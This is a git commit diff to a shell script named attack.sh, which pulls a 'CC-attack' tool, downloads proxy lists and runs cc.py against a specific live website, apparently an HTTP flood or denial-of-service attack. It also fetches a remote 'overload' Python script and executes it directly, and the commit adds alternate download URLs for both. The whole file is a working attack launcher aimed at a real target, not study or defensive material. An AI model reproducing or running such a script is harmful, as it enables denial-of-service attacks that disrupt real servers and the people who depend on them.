02210c76f51fc300bf38f674095a7a112f82039f
NyaaCaster <110224598+NyaaCaster@users.noreply.github.com>
2023-02-16 15:52:34 +0800

    Update attack.sh

--- attack.sh
+++ attack.sh
@@ -6,6 +6,7 @@ echo "CC-attack"
 cd CC-attack
 git pull
 curl https://jsd.cdn.zzko.cn/gh/TheSpeedX/PROXY-List@master/http.txt -o http.txt
+curl https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt -o http.txt
 python3 cc.py -url http://ffwe66.top/ -f http.txt -v 5 -s 30
 cd ..
 
@@ -21,5 +22,6 @@ echo "overload"
 cd overload
 git pull
 curl https://jsd.cdn.zzko.cn/gh/NyaaCaster/Nyaa-Automata@main/overload_p.py -o overload_p.py
+curl https://nyaacaster.github.io/Nyaa-Automata@main/overload_p.py -o overload_p.py
 python3 overload_p.py
 cd ..
